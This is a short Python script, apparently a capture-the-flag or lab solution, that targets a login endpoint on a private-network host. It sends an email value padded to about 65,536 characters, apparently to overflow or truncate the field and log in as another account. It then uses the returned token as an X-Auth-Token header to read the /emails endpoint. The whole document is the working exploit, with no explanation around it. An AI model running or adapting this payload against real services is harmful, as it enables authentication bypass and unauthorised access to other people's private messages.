import requests as rq

target_url = "http://10.0.9.136:1337"
login_path = "/login"
email_path = "/emails"

login_json = {
    "email": "mc-fat@monke.zip" + "B"*8 + "t" + "C"* ((1 << 16) - 9),
    "password":"abc"
}

email_header = {}

r_post = rq.post(url=target_url + login_path, json=login_json)
email_header = r_post.json()
email_header['X-Auth-Token'] = email_header.pop('token')

r_get = rq.get(url=target_url + email_path, headers=email_header)
print(r_get.text)